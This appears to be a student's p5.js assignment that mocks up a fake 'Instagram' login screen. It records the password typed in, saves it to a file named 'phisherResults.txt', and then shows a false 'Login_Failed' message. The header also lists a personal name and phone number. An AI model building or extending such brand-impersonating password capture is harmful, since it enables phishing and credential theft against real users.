//////////////////////////
//                      //
//CSMA10                //
//Intro To Programming  //
//Fall 19a              //
//Hector Garcia Torres  //
//407-520-2802          //
//////////////////////////



var phisherText;
var passwordText = "";
var submitText = false;
var counter = 0;
function setup()
{
    createCanvas (600,600);


    

}

function draw()
{
    background(255);
    
    // Text Block + Visuals
    
    rect(0,0,599,599);
    textSize(30);
    text(' "Instagram"  ',200,100);
    
    textSize(20);
    text("Password",210,300);
    
    rect(210,320,250,30);
    text(passwordText,215,325,20,20); // Displays Keyboard Input
    
    textSize(20);
    text("Type in your password to log in, press 'ENTER' once finished.",50,500);

 
    //Outputer
    
    if (submitText == true) // If Enter key is pressed/ output txt.
    {
        phisherText = createWriter('phisherResults.txt');
        phisherText.write([passwordText]);
        phisherText.close(); 
        submitText = false;
        passwordText = "Login_Failed";
                    
    }


    
    
    
}

function keyTyped()  // logs keyboard input and converts it into char
{
       passwordText += char(keyCode); 

}

function keyPressed() // keyTyped does not recognize ENTER ASCII only keyPressed.
{
        if(keyCode === ENTER)
        {
            submitText = true;
        }
        

}
